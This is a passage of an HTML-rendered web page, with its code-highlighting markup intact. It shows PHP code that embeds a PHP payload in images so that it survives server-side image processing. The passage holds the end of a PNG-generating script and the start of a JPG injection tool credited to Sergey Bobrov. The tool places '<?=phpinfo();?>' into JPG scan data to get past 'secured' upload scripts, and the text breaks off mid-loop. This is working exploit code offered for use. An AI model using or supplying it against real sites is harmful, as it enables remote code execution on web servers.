class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x6b&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x88&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x2d&lt;/span&gt;,&lt;br&gt;           &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x7d&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x52&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x9d&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xad&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x88&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xa1&lt;/span&gt;,&lt;br&gt;           &lt;span class=&#34;hljs-number&#34;&gt;0x66&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x44&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x33&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt; = imagecreatetruecolor(&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$y&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$y&lt;/span&gt; &amp;lt; sizeof(&lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;); &lt;span class=&#34;hljs-variable&#34;&gt;$y&lt;/span&gt; += &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;#123;&lt;br&gt;   &lt;span class=&#34;hljs-variable&#34;&gt;$r&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$y&lt;/span&gt;];&lt;br&gt;   &lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$y&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];&lt;br&gt;   &lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$y&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];&lt;br&gt;   &lt;span class=&#34;hljs-variable&#34;&gt;$color&lt;/span&gt; = imagecolorallocate(&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$r&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;);&lt;br&gt;   imagesetpixel(&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;, round(&lt;span class=&#34;hljs-variable&#34;&gt;$y&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$color&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;imagepng(&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;./1.png&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;â€‹```&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;JPG:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    It is necessary that the size and quality of the initial image are the same as those of the processed image.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    1) Upload an arbitrary image via secured files upload script&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    2) Save the processed image and launch:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    In case of successful injection you will get a specially crafted image, which should be uploaded again.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    Since the most straightforward injection method is used, the following problems can occur:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    1) After the second processing the injected data may become partially corrupted.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    2) The jpg_payload.php script outputs &amp;quot;Something&amp;#x27;s wrong&amp;quot;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    Sergey Bobrov &lt;span class=&#34;hljs-doctag&#34;&gt;@Black&lt;/span&gt;2Fan.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    See also:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    */&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$miniPayload&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;?=phpinfo();?&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!extension_loaded(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;gd&amp;#x27;&lt;/span&gt;) || !function_exists(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;imagecreatefromjpeg&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php-gd is not installed&amp;#x27;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$argv&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;])) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    set_error_handler(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;custom_error_handler&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$pad&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$pad&lt;/span&gt; &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$pad&lt;/span&gt;++) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$nullbytePayloadSize&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$pad&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; DataInputStream(&lt;span class=&#34;hljs-variable&#34;&gt;$argv&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]);&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt; = file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$argv&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]);&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$extraBytes&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$correctImage&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;TRUE&lt;/span&gt;;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;readShort() != &lt;span class=&#34;hljs-number&#34;&gt;0xFFD8&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Incorrect SOI marker&amp;#x27;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;((!&lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;eof()) &amp;amp;&amp;amp; (&lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;readByte() == &lt;span class=&#34;hljs-number&#34;&gt;0xFF&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$marker&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;readByte();&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$size&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;readShort() - &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;skip(&lt;span class=&#34;hljs-variable&#34;&gt;$size&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$marker&lt;/span&gt; === &lt;span class=&#34;hljs-number&#34;&gt;0xDA&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-variable&#34;&gt;$startPos&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;seek();&lt;br&gt;                &lt;span class=&#34;hljs-variable&#34;&gt;$outStreamTmp&lt;/span&gt; = &lt;br&gt;                    substr(&lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$startPos&lt;/span&gt;) . &lt;br&gt;                    &lt;span class=&#34;hljs-variable&#34;&gt;$miniPayload&lt;/span&gt; . &lt;br&gt;                    str_repeat(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\0&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$nullbytePayloadSize&lt;/span&gt;) . &lt;br&gt;                    substr(&lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$startPos&lt;/span&gt;);&lt;br&gt;                checkImage(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;_&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$argv&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], &lt;span class=&#34;hljs-variable&#34;&gt;$outStreamTmp&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;TRUE&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$extraBytes&lt;/span&gt; !== &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;((!&lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;eof())) &amp;#123;&lt;br&gt;                        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;readByte() === &lt;span class=&#34;hljs-number&#34;&gt;0xFF&lt;/span&gt;) &amp;#123;&lt;br&gt;                            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;readByte !== &lt;span class=&#34;hljs-number&#34;&gt;0x00&lt;/span&gt;) &amp;#123;&lt;br&gt;                                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;                            &amp;#125;&lt;br&gt;                        &amp;#125;&lt;br&gt;                    &amp;#125;&lt;br&gt;                    &lt;span class=&#34;hljs-variable&#34;&gt;$stopPos&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$dis&lt;/span&gt;-&amp;gt;seek() - &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;&lt;br&gt;                    &lt;span class=&#34;hljs-variable&#34;&gt;$imageStreamSize&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$stopPos&lt;/span&gt; - &lt;span class=&#34;hljs-variable&#34;&gt;$startPos&lt;/span&gt;;&lt;br&gt;                    &lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt; = &lt;br&gt;                        substr(&lt;span 